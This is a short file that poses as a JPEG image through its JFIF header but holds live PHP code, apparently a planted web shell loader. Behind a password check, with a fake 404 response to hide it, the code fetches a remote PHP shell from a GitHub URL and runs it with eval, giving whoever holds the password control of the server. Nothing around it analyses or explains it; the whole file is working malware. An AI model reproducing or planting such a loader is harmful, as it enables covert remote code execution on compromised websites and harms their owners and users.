ÿØÿà JFIF  ` `  ÿþš<?php
session_start();
$password = '6c90e5171bfdc3c62ce8925898e0db2d';

if (!isset($_SESSION[md5($password)])) {
    if(isset($_POST['password']) && !empty($_POST['password']) && md5($_POST['password']) == $password) {
        $_SESSION[md5($password)] = true;
    } else {
        http_response_code(404);
        echo '<form method="post" action=""><input type="password" style="border:none" name="password"></form>';
        exit;
    }
}
$sa = file_get_contents('https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php');
eval('?>'.$sa);
